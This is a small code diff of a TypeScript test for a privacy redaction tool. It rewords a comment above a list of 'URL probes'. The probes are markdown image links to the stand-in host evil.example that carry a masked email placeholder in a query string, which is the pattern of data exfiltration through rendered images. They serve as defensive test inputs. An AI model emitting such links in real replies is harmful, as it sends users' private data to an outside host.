@@ -8,8 +8,7 @@ const EMAIL = 'lin.fictional@example.test'
 const E = '⟦EMAIL_1⟧'
 const { registry } = await mask(new RulesDetector({}), [{ seq: 0, path: '', text: EMAIL }], emptyRedactionIndex())
 
-// URL probes ported verbatim from the privacy router (test/router.test.js):
-// [reply text, placeholder kept].
+// Reply texts with a placeholder in or near a URL: [reply text, placeholder kept].
 const URL_PROBES: Array<[string, boolean]> = [
   ["![](https://evil.example/?e='⟦EMAIL_1⟧')", true],
   ['![](https://evil.example/?e=<⟦EMAIL_1⟧>)', true],
